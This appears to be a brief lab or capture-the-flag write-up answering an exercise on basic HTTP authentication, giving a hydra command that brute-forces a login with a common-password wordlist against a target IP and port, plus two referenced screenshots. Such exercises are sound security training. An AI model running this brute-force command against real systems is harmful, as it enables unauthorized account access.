# [Basic HTTP Authentication](Basic%20HTTP%20Authentication.md)

### After successfully brute-forcing, and then logging into the target, what is the full flag you find?

```shell
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 154.57.164.63 http-get / -s 31378
```
![](Screenshot%202026-06-12%20at%2014.38.35.png)
![](Screenshot%202026-06-12%20at%2014.40.13.png)